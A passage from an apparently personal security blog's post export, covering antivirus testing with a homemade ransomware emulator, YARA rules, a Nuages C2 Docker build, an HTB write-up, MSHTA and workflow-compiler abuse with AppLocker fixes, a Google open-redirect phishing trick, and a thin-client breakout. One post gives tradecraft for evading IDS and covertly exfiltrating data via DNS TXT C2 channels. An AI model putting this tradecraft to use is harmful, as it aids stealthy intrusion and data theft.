names from the authors, everything.&nbsp;&nbsp; &nbsp;Now these are well known files with signatures everywhere you look to detect them. How does Defender do with something completely new? For this, I wrote a quick ransomware emulator. It just encrypts a random file I made on execution. &nbsp;&nbsp; &nbsp;Here is where Defender and Sophos started to differ. This sample, when converted to an exe, was caught by 16/68 products... That's not great. Among those that caught this were Defender, FireEye, and BitDefender. And for some reason McAfee. This was unexpected. I had high expectations that even common AV would be able to identify an executable encrypting arbitrary files. But Sophos and a number of others fell flat here.&nbsp;&nbsp; &nbsp;I thought that maybe this was only doing some sort of static code analysis only and that run time protection on the VM would be able to block this, but no. I was able to encrypt the random txt file. At this point I wanted to make the simulation a little more real in the hopes that other AV's might catch this new behavior more accurately. I changed the path from that random txt name to encrypting all txt files in the folder. This still wasn't caught... This isn't entirely true though. Each time this was run, SmartScreen kicked up an error since the code was missing a cert, so point to Defender there. &nbsp;&nbsp;&nbsp; The last piece I want to test is phishing detection. For this, I pulled a random submission any.run that was flagged with phishing. I tested Defender first and in Edge the site was detected! But, in Brave, the site was not flagged as such. It would be nice if this functionality was extended to other browsers but this is a pretty big lift. On the other side, Sophos didn't detect this at all and let me proceed normally.Conclusions&nbsp;&nbsp;&nbsp; In all of this, Defender has scored pretty high marks from me and has evidently improved leaps and bounds from where it was even a few years ago. Are you fine running this? Most likely. It picks up on the simple traits in my exe and accurately flags it as dangerous. I'm going to work to make my test set more obfuscated so that when I revisit this, I can test it more thoroughly. One area that it missed the mark on is legacy OS support. If you're not receiving Windows updates anymore, Defender won't be of use. Of note as well, in Gartners Magic Quadrant, while Defender scored well overall, it missed a few marks if used as an enterprise solution due to cost and capabilities. I'm going to quote them for this:&nbsp;There is a large gulf in capability and cost between SKUs providing MDE and those that do not, and some organizations are consequently unable to justify the cost premium of Microsoft Defender for Endpoint. Licensing Microsoft Defender individually outside of security bundles is also not cost-effective for these customers. This led to a lower score than the leading vendors in this Magic Quadrant for Sales Execution/Pricing for 2021.&nbsp; " }, { "title": "Using YARA To Detect Python Executables", "url": "/posts/using-yara-to-detect-python-malware/", "categories": "", "tags": "", "date": "2020-07-14 15:48:00 +0000", "snippet": "Python malware is on the rise, with many low level criminals switching to it for it's ease of use, low entry level, and many libraries available to choose from. However, the most widely used tools ...", "content": "Python malware is on the rise, with many low level criminals switching to it for it's ease of use, low entry level, and many libraries available to choose from. However, the most widely used tools for transforming them into PE files also leave behind common signatures that tell us the file we've downloaded was once a Python script, making detecting potential malware much easier.YARA is a great tool that allows us to write detection scripts with, and allows us to detect Python executable files with a high level of accuracy. Take the below rule, this will trip on meta data left behind by Py2EXE.import \"pe\"rule py2exe{&nbsp;&nbsp;condition:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for any i in (0 .. pe.number_of_resources - 1):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(pe.resources[i].type_string == \"P\\x00Y\\x00T\\x00H\\x00O\\x00N\\x00S\\x00C\\x00R\\x00I\\x00P\\x00T\\x00\")}Similarly, we can detect the meta data left behind by PyInstaller.import \"pe\"rule pyinstaller{&nbsp;&nbsp;&nbsp;&nbsp;strings:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a = \"pyi-windows-manifest-filename\"&nbsp;&nbsp;&nbsp;&nbsp;condition:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pe.number_of_resources &gt; 0 and $a}YARA can be used to detect far more than just these examples, and as you can see it's very flexible. I encourage you to take what we've reviewed here and try to write your own rules. " }, { "title": "Containerizing Your C2: Nuages, Docker, & A Dusty Pi", "url": "/posts/containerizing-your-c2-nuages-docker/", "categories": "", "tags": "c2, container, docker, nuages", "date": "2020-05-16 18:51:00 +0000", "snippet": "Why?I wanted a low powered container platform and had a rPi 3b sitting around collecting dust. This project isn't for any practical reasons, but I wanted to emulate what bigger companies do, dyna...", "content": "Why?I wanted a low powered container platform and had a rPi 3b sitting around collecting dust. This project isn't for any practical reasons, but I wanted to emulate what bigger companies do, dynamically create C2's as they need for any client operations. I also figured this would be a good learning experience for Docker. Files found here.What software was used?Platform: Docker:Server:&nbsp;Engine:&nbsp; Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 19.03.8&nbsp; API version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.40 (minimum version 1.12)&nbsp; Go version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; go1.13.8&nbsp; Git commit:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; afacb8b7f0&nbsp; Built:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wed Mar 11 22:48:33 2020&nbsp; OS/Arch:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; linux/arm64&nbsp; Experimental:&nbsp;&nbsp;&nbsp;&nbsp; false&nbsp;containerd:&nbsp; Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.3.3-0ubuntu2 Ubuntu:Static hostname: ubuntu&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Icon name: computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Machine ID: 577559a1018f47d3828d7448607a6aa1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Boot ID: b35d8bf81ae246dd9ee52d653b9e11e4&nbsp; Operating System: Ubuntu 20.04 LTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Kernel: Linux 5.4.0-1008-raspi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Architecture: arm64 Containers: Mongodb:latestDebian BusterHow did this come together?Nuages Dockerfile: FROM debian:latestCOPY Nuages /WORKDIR /Server/RUN apt-get update -qy;\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; apt-get install python3 -qy;\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; apt-get install npm -qy;\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; npm install;\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; chmod +x setup.js;\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node setup.js matt matt mongodb://192.168.10.66:27017;\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; npm installWORKDIR /Clients/Nuages_Cli/RUN npm installWORKDIR /Server/CMD [\"bash\", \"start.sh\"]I rewrote a fair amount of the setup.js file from P3nt4s' original Nuages so that it could take parameters being passed from the CLI. It runs through our needed setup that'd be taken care of by the setup.sh script normally. I'm passing the username: matt password: matt and the database string that we will be setting up next. It also sets up the NPM dependencies for us. Find the updated copy of setup.js on my Github. Another area to note, I don't define the user running this container, meaning it's running as root. This can be a problem if the container were to be compromised and something we will fix. Build this with: docker build -t nuages_template .I then used Docker to run the Mongodb instancedocker run --rm -d -p 27017:27017 mongo&nbsp;This downloaded and setup a MongoDB container with port 27017 mapped from the host to it. This also meant that UFW had to know to allow 27017 in. We also have to allow the beacon port in for Nuages, so might as well knock both out in the same go. I didn't hard code the port into the Nuages script as I wanted to be able to change that easily. We'll use port 8080 for now:sudo ufw allow 27017sudo ufw allow 8080sudo ufw reload &nbsp;Now that everything on UFW and Mongo is ready to go, let's run our Nuages container:docker run --rm -d -p 8080:8080 nuages_template&nbsp;&nbsp;This should return successfully and have port 8080 mapped from it to the host. You can terminal into it with&nbsp;docker exec -it &lt;containerID&gt; /bin/bash and get access to the C2 features.Constraints &amp; Lessons learned?64bit architecture versus 32bit. The first images I used for testing this were all 32bit. I didn't think anything of it at the time, but when trying to get my Nuages container to work with my MongoDB instance, the version of Mongo was incorrect and there wasn't another available. I then tried searching for a Docker container that could run Mongo and nothing was showing up. In my first test before moving to my rPi, I was running Debian Buster 64bit and figured that Raspbian is based on Debian so this should carry over fine. I was wrong. The 32bit nature of Raspbian posed a big challenge that I wasn't able to get around, so I swapped to Ubuntu 20.04 ARM64 image." }, { "title": "Setting Up Grafana To Display Nessus Results And Jira Tasks", "url": "/posts/setting-up-graphana-to-display-nessus/", "categories": "", "tags": "graphana, nessus, jira", "date": "2020-05-15 16:53:00 +0000", "snippet": "This is a run through on setting up Grafana to pull data from Nessus and tasks from Jira.Prerequisites:&nbsp;Two VMs capable of 4 GB of RAM, 2 Cores, 32 GB Disk space each.Nessus Version: Nessus-8....", "content": "This is a run through on setting up Grafana to pull data from Nessus and tasks from Jira.Prerequisites:&nbsp;Two VMs capable of 4 GB of RAM, 2 Cores, 32 GB Disk space each.Nessus Version: Nessus-8.10.0-es8.x86_64.rpmInstalled with: rpm –ivh Nessus-8.10.0-es8.x86_64.rpm&nbsp;OS: Fedora 31-1.9Setting up Grafana&nbsp;&nbsp; Add a new file to your YUM repo and populate it with the data below.&nbsp;&nbsp;&nbsp;sudo nano /etc/yum.repos.d/grafana.repo[grafana]name=grafanabaseurl=https://packages.grafana.com/oss/rpmrepo_gpgcheck=1enabled=1gpgcheck=1gpgkey=https://packages.grafana.com/gpg.keysslverify=1sslcacert=/etc/pki/tls/certs/ca-bundle.crt&nbsp;&nbsp;&nbsp; Once that is done, we can install Grafanasudo yum install grafana&nbsp;&nbsp;&nbsp; We will need to allow this through on the firewall, it uses port 3000Firewall-cmd -–add-port=3000/tcp --permanentFirewall-cmd –reload&nbsp;&nbsp;&nbsp; Log into the Grafana dashboard at &lt;localhost&gt;:3000, the username and password is admin/admin&nbsp;&nbsp;&nbsp; On first login, and after updating the admin password, we are presented with a view of tasks to be done. The first is to add a data source. Select MySQL and enter the host IP, database name, DB username/password, and be sure that the user only has the SELECT permission on the database. Name this after the first client, you will be working with. Save &amp; Test.&nbsp;&nbsp;&nbsp; We will then set up a new dashboard. Mouse over the + and click Dashboard. You should now see a new view with a blank panel prompting you to add a query or choose a visualization. Click Add Query. You will be brought to a screen showing a MySQL query that we will modify. First, depending on the client that you are setting up, you want to select from the “query drop down” menu the correct client we are writing this for. If this dashboard is for Client 1, make sure the query is for Client 1. Modify the query to reflect the below image. We are telling MySQL to pull data from a table called \"test\" and select the column \"number_of_vulns\", and \"time\" which we'll use to chart a trend graph.Setting up SQL Clients&nbsp;&nbsp;&nbsp; We need to setup a test client with a MySQL DB to emulate how our Nessus scanner will send results. &nbsp;Edit the MySQL cnf file to add the linebind-address = IPofGrafanaLogin as root to MySQL and create the database and userCREATE DATABASE nessus_scans CHARACTER SET utf8mb4 COLLATE utf8mb4_bin;CREATE USER 'client1_sql_connector'@'localhost' IDENTIFIED BY 'Str0ngDBP@ssw%rd';GRANT SELECT on nessus_scans.* TO 'client1_sql_connector'@'IPofGrafana' IDENTIFIED BY 'Str0ngDBP@ssw%rd';FLUSH PRIVILEGES;QUIT;Create the table for Nessus results&nbsp;&nbsp;CREATE TABLE test( id int NOT NULL auto_increment, time datetime NOT NULL DEFAULT CURRENT_TIMESTAMP, number_of_vulns INT NOT NULL, PRIMARY KEY (ID) );The insert statement I used to test this:INSERT INTO test (number_of_vulns) VALUES (50);Id and Date are auto calculated, we only need to fill in the number of vulnerabilities detected for our test.&nbsp;&nbsp;&nbsp; Create additional databases and tables for each piece of software being used. Pictured below are the Grafana customization's for each panel and the table layout.A note about Nessus. As many will point out, Nessus no longer allows base installations to utilize API functionality. You need to have Tennable IO or Tennable SC to be able to utilize the API at all. In a later post, I will go over how you can setup a query to pull the necessary fields we use here and display them on Grafana, but for now this can be populated with test data. When we do get the API setup, we will be pulling down the total number of vulnerabilities detected in that scan so that we can make a trend graph and show rises and falls over time. Below, you will find screenshots of how both this Jira and Nessus Panels are setup, to give you a better idea of what the queries look like.Jira Tasks PanelNessus Vulnerabilities Panel&nbsp;Connecting Jira DB to Graphana I think this needs a section all of it's own. I didn't go through the Jira API in order to pull who was working what tasks and instead wrote some SQL queries and generated a special user to query the Jira DB. At the time of writing this, it was a lot quicker to do and because the user was only granted select, I wasn't too worried about the security of this. If I could go back and spend more time on this, I would definitely work with the API to pull the needed information into a seperate SQL DB then import it from there. I actually recommend doing it this way because it will allow you to correlate the usernames of assignees on tickets with their internal Jira ID better. As it stands right now, when this displays ticket statuses, the assignee column will say JIRAUSER10000 instead of my username. The usernames are stored in another table, app_user. Without further ado, here is how Jira lays out the MySQL DB and how you can pull from it.The table we will be referencing is called jiraissue. It holds the issue summary, type, creator, assignee, and a whole host of other descriptors.Jira.jiraissue layout:&nbsp;We will be using the \"created\", \"assignee\", and \"summary\" fields. Create a new user like the one below:&nbsp;We then grant select to our new user for this table:&nbsp; It’s important as well to open 3306 on the firewall to allow Grafana to make SQL calls:&nbsp;And finally the Grafana board properties:" }, { "title": "HTB - Nest Writeup", "url": "/posts/htb-nest-writeup/", "categories": "", "tags": "", "date": "2020-02-16 16:00:00 +0000", "snippet": "&nbsp;&nbsp; &nbsp;This was my first Hack The Box challenge and I've been waiting for so long to post this. It took a lot of work and a lot of trying to work through problems I created for myself, ...", "content": "&nbsp;&nbsp; &nbsp;This was my first Hack The Box challenge and I've been waiting for so long to post this. It took a lot of work and a lot of trying to work through problems I created for myself, but in the end it was a super satisfying box to own and a great first experience.Lets start with checking the open ports on the machine:We see only SMB is open so we should check for shares now:From this, we are able to determine that there is an ADMIN$, C$, Data, Secure$, and Users share. We need to log into one of these shares to poke around but we don't have any credentials yet. Let's see if it takes an anonymous login. Access is denied on the ADMIN$ share and on the C$ share, but we are able to get in on the Data share!We'll be using the \"cd\" and \"dir\" commands to look around. From the TLD we can see there are a bunch of sub directories of interest.&nbsp; IT, Reports, and Production look particularly interesting. Unfortunately, we can't get into any of them, except Shared.Templates looks interesting to me so lets take a dive into there and see what we find... HR information! Always valuable and always a great place to look for information, lets see what we got in there.A welcome email might have some default credentials we can try, lets pull it down. It looks like we've gotten everything else we can from this directory so exit and check out whats on the other shares. We can get onto Secure$ but can't run anything on there yet.Hopping onto the Users share, though, we see a list of some user accounts!Unfortunately, we can't access anything on this share either. Lets hop back off and check whats in the HR letter.This looks very promising, we got the credentials for TempUser! Using these new found credentials, we can get into only the Data share:We can see a few folders within this share, but only two of them have sub folders:There's going to be a lot of information in the IT folder, so lets recursively download it all:We can exit out of SMB for now and take a look at what we've found:Working our way through this, RU_Config is the first file we'll check:This is very good! We've got an encrypted password for the user c.smith! Keep in mind, everything we'll need to get this password should be on this machine, so using online encryption crackers shouldn't work.&nbsp; Continuing to work our way back up, lets now look at the NotepadPlusPlus files:We can see right at the bottom of the output, there's a reference to a user named carl in the Secure$ share. Let's see if we can get on with his account:We're able to get in without supplying a password! But unfortunately, it looks like access is denied to reading all the files on here.Let's try this user against the Secure$ share:We're able to get in but everything is still denied. Maybe our TempUser can navigate to the sub folder we need:&nbsp;This is promising. We've got a bunch of VB project information. Again, let's recursively download all of this to save ourselves a bit of time: There is a LOT of stuff in here. It seems we've got a project for something called RUScanner, maybe it's related to our RU_Config.xml file we got earlier? Let's take a look: Inside the RUScanner folder, we've got a few files for a VB project. None of them have much of note, except for the Utils.vb project:&nbsp;It looks like this is a decrypt function for an encrypted string. We&nbsp;should be able to feed our string found in RU_Config.xml into this and get a password back. For this we'll need a compiler, and since you can't compile VB on Linux we'll use an online one. &nbsp;We have to change one thing, The AES encryption method it wants to use, AesCryptoServiceProvider, won't work on a web based compiler, so let's change it to RijndaelManaged. The reason being is that AES is based on Rjindael, just restricted to 128 bits. By changing to Rjindael, we should get the same expected output.After compiling the code with the encrypted string, it looks like we've got a password back! Next we'll try and log into c.smith with it and see if we can finally get the user flag.&nbsp;Success! We've got the user flag and have successfully owned this portion.Overall, this was a challenging box to go at as my first Windows User own. I liked the parts of having to investigate code, and thankfully there were a ton of online VB compilers to test against. The part where I got stuck the longest was trying to find the flag in the NP++ file. That easily took me the longest amount of time to find and I had to look through a lot of forum posts before I found it." }, { "title": "MSHTA Files & Exploitations", "url": "/posts/what-is-it-microsoft-html-application/", "categories": "", "tags": "", "date": "2019-02-21 19:53:00 +0000", "snippet": "What is it:Microsoft HTML Application Host and CHM files. The program is located at C:\\Windows\\SysWOW64An outdated relic on Windows machines used to host help documents.Microsoft has documented tha...", "content": "What is it:Microsoft HTML Application Host and CHM files. The program is located at C:\\Windows\\SysWOW64An outdated relic on Windows machines used to host help documents.Microsoft has documented that this is no longer supported:The Internet Explorer team is increasingly focused on standards compliance, and markup-based behaviors are not part of modern web standards. In IE10 mode support for markup based behaviors has been removed, and this includes hta:application.Some companies and hardware vendors are still using these file formats to manage their software.FireEye outlines an effective attack exploiting HTA:A threat actor emails a Microsoft Word document to a targeted user with an embedded OLE2 embedded link objectWhen the user opens the document, winword.exe issues a HTTP request to a remote server to retrieve a malicious HTA fileThe file returned by the server is a fake RTF file with an embedded malicious scriptWinword.exe looks up the file handler for application/hta through a COM object, which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious scriptHow it works:The rough outline for how it works can be seen in the last step of the attack outlined above. To go into more detail; the word document makes a request to the DCOMLaunch service which causes the service host process (svchost) hosting the word document to execute the Microsoft HTML Application Host(MSHTA) service which then executes the VBScript embedded in the HTA document (paraphrased from FireEye).There are multiple areas of potential exploit using this method. The two biggest are that these HTA files run as a fully trusted application and that the VBS they can execute also has a high level of inherent trust. This means that these applications will very rarely cause a UAC prompt to pop.Affected Versions:Up to&nbsp;Windows 10 Version 1607Mitigation:Anti-virus and end point protection products like Sophos stop these threats out of the box most of the time. If you don't have an end point solution already in use, then an app locker policy should help quite a bit. See an example one below. We will use the file hash of the file since that should not change as it is no longer under development.In Local Security Policy, expand Application Control Policies -&gt; AppLockerRight click Executable Rules -&gt; Create New RuleSelect Deny and the user or group who it should be denied toSince the Path of the file can be changed, select the File Hash option for blockingBrowse to the file in question, and add itCreate!Documentation:https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.htmlhttps://web.archive.org/web/20130925022744/https://connect.microsoft.com/IE/feedback/details/785055/hta-application-tag-does-not-work-in-ie10https://blog.checkpoint.com/2015/05/12/the-microsoft-help-file-chm-may-enslave-you/" }, { "title": "What Is Microsoft.Workflow.Compiler.exe And Why Should You Disable It", "url": "/posts/what-is-microsoftworkflowcompilerexe/", "categories": "", "tags": "", "date": "2018-11-08 20:00:00 +0000", "snippet": "What is it?This is a built in function for C# in Microsoft Windows that essentially allows arbitrary unsigned code execution. It is part of the .NET framework and it works by combining a serialized...", "content": "What is it?This is a built in function for C# in Microsoft Windows that essentially allows arbitrary unsigned code execution. It is part of the .NET framework and it works by combining a serialized workflow with an XML of serialized compiler arguments.Running this compiler on some C# code allows for a fileless payload and execution. In my test, this was used for a remote shell out from one computer to another.How does it affect me?Users can easily download macro enabled Office documents that contain scripts designed to pull down the necessary source files and compile them into a working attack. Office macros have and always will be a huge attack vector, and disabling them outright is not an option in most cases.In my test case, I wrote a macro to create and execute a VBS file that pulls down all needed source files. I event went so far as to mask my requests with a Google URL which I described in a previous post. This would render it harder for outgoing connections to be determined malicious. The Office document in question only raised flags on 6 AV's and that was because they recognized the VBScript being created downloaded other files. However these were not industry recognized brands or brands you would find in most corporate environments.RemediationI recommend using Windows AppLocker to prevent the use of Microsoft.Workflow.Compiler.exe as well as preventing PowerShell from downloading files. This would stop most Office malware from executing, and most users do not have a good reason to be using the workflow compiler. See an example AppLocker policy below to restrict this.In Local Security Policy, expand Application Control Policies -&gt; AppLockerRight click Executable Rules -&gt; Create New RuleSelect Deny and the user or group who it should be denied toSince the Path of the file can be changed, select the File Hash option for blockingBrowse to the file in question, and add itIt can be found at this location&nbsp;C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exeCreate!" }, { "title": "Phishing Redirects Through Google URLs - Patched out as of 3/19/19", "url": "/posts/phishing-redirects-through-google-urls/", "categories": "", "tags": "", "date": "2018-09-24 17:38:00 +0000", "snippet": "I came across an interesting attack recently when browsing any.run submissions.It was a PDF that had a hyper link in it to click.The link went to appengine.google.com - a pretty innocuous URL. Anyo...", "content": "I came across an interesting attack recently when browsing any.run submissions.It was a PDF that had a hyper link in it to click.The link went to appengine.google.com - a pretty innocuous URL. Anyone would trust it. It's Googles cloud compute platform.However, it pivoted off of there to a malicious webpage using URL flags.The whole URL looked like https://appengine.google.com/_ah/logout?continue=https://www.maliciousdomain.comWhat's more worrying though is that by clicking it, you were prompted if you trusted the parent domain in the URL - Google. Not the URL it redirects to once you've clicked the link.This is worrying - especially considering that Google just moved last Spring to stop domain fronting.Additionally, only one engine on VirusTotal flagged this as malicious - Kaspersky.&nbsp;Update 10/2/2018This attack vector is currently being used by Emotet. AlienVault USM was able to detect multiple threats attempting to utilize this to trick users into following malicious links.Update 3/19/2019 - This has been patched out by Google" }, { "title": "Designing Stable C2 Architecture ", "url": "/posts/designing-stable-c2-architecture/", "categories": "", "tags": "", "date": "2018-08-03 12:28:00 +0000", "snippet": "C2 Architecture is one of the most important aspects of the APT world.Proper C2 architecture lets you subvert IDS, antivirus, and network analysts.It lets you exfiltrate data. It lets you move late...", "content": "C2 Architecture is one of the most important aspects of the APT world.Proper C2 architecture lets you subvert IDS, antivirus, and network analysts.It lets you exfiltrate data. It lets you move laterally across networks while raising minimal flags.How do you do this properly?Too much data going out one point, and it raises flags. Too much data moving between nodes that don't normally have connections to each other, alarms raised. Too much user account activity on nodes that don't normally have that - Alarms. Raised.Modern SIEMs make it very difficult to create abnormal data traffic thanks to anomaly detection and heuristic analysis.These systems are not perfect though, and the false sense of security they provide can actually be a pen testers advantage. Since people treat these systems as infallible, they rely heavily on the data provided and without them the analysts are nothing.You have a few routes to get around this. You can masquerade your traffic as normal SMB traffic around the network, or even better, masquerade it as router traffic like RIP or OSPF. IDS systems are very careful not to intercept or mess with router communication.Getting traffic out of the network is even harder. While it will be easier than initiating a connection from the outside in, since these will be blocked outright, it still raises a lot of flags watching a lot of different systems all of a sudden communicating with one server. I know from personal experience that a lot of data being transferred to outside the network will raise alarms. What you are looking for is to route traffic through one of the compromised nodes and out from there to the first stage of the C2 systems. Seeing multiple nodes communicating out to one cloud device will raise alarms. Seeing one node, specifically one that already does out of network communications, will raise less flags.Creates a lot less traffic than:These are inherent flaws in how logs are collected. If a device that normally does a lot of out of network communication is put on an IDS, it will generate a lot of alarms. These will be, over time, tuned out due to the amount of volume they create. Taking Target as an example. A flood of small alarms will hide more important ones, which can lead to systems being compromised if their alarms are not dealt with fast enough. A smart pen tester will abuse this tuning to try and find a high threshold of outbound traffic which doesn't trigger alarms. Smarter IDS will use machine learning and AI to take some of the manual work out of these alarms, but smaller operations generally can not afford these systems as of yet.It's important to masquerade traffic leaving the system as something encrypted but simultaneously innocuous. Something to consider is DNS TXT records. You can host a server on a cloud compute platform that is set to respond to DNS requests. These TXT records can contain any variety of commands for your slaves to receive and generally IDS systems will not alarm on these. This makes it fairly easy to abuse. One thing to note is that the IDS might read the contents of the TXT response. I suggest XORng the commands or using some other kind of obfuscation so as to make it harder to determine what is in the responses to non authenticated eyes.One more step is to create an election process within the compromised nodes, so that when one master goes down, another one is elected. Simplicity is better. The sky's the limits with what factors can go into this, but don't make it more complicated than it needs to be. Something like sending out probes to each node neighbors then seeing who gets the highest probe count would be adequate for considering who becomes the master node and who then gets to route traffic out to the C2 server." }, { "title": "Breaking Out Of Dell Wyse 30 Series ThinClients & How To Stop This", "url": "/posts/breaking-out-of-dell-wyse-30-series/", "categories": "", "tags": "", "date": "2018-07-21 01:55:00 +0000", "snippet": "This was post was updated 9/21/2018ThinClients are somewhat ubiquitous&nbsp;in businesses. They reduce the overhead for onboarding new employees, are easy to manage, reduce the maintenance costs of...", "content": "This was post was updated 9/21/2018ThinClients are somewhat ubiquitous&nbsp;in businesses. They reduce the overhead for onboarding new employees, are easy to manage, reduce the maintenance costs of desktops, and are all around good alternatives for companies who can spend money better elsewhere.The 3040 comes locked down with no right-click functionality, you can't access&nbsp;windows explorer, and you can't open command prompt or the run dialogue/taskmanager.There are very few default apps available.However, ThinClients also have inherent&nbsp;flaws in them.The one I am looking at today is the Wyse 3030. This is a full ThinClient with Windows 7 embedded into it with a RAM disk. Out of the box, it is pretty easy to set up and start working and connects easily to virtual hosts. Which is where the trouble begins.This attack hinges on a few options in the VMWare Horizon Client being enabled, pictured below.Once connected to a VM, you will be prompted whether or not you want to mount the local machine and its file system. And you are prompted for this after every time you restart the Wyse machine and connect to a host.If you do mount the Wyse machines file system, you've pretty much gained root access. Once your VDI machine is mounted, open the file path and locate the shortcut for command prompt we made and copy it to your Wyse machines desktop folder.Back on the Wyse, you should now have a cmd icon.Opening this will now open a command prompt window that was previously inaccessible for you.Since the default admin password resets on reboot, this should be easy to locate on Google - provided it wasn't set up through Wyse management.Once found, you can use runas&nbsp;to open an administrator powershell prompt within command prompt.To stop this attack, you need to make a registry key on the ThinClient. This, unfortunately, can not be done from the Wyse management studio and has to be done from the local machine itself. Adding this key will stop file sharing on the machine [HKEY_LOCAL_MACHINE\\Software\\Policies\\VMware, Inc.\\VMware VDM\\Client] “DisableSharing”=”true” (This remediation was taken from&nbsp;https://www.yannickvr.nl/vmware-horizon-view-client-disable-client-drive-redirection/)This issue may seem small but many organizations have a need for securing sensitive data, and the fact that data can be copied down to a machine with no lockdown, and that this machine can be elevated to root easily, means there's an inherent security flaw in this design and ability to secure data.Most companies lock down USB access on VM's but not the thin clients since they are just used as access machines. Even if you are able to lock down the USB level access on the ThinClient, it gets reset on every reboot. If you are able to configure that to be persistent, it still doesn't matter since the user is able to get a command prompt." } ]
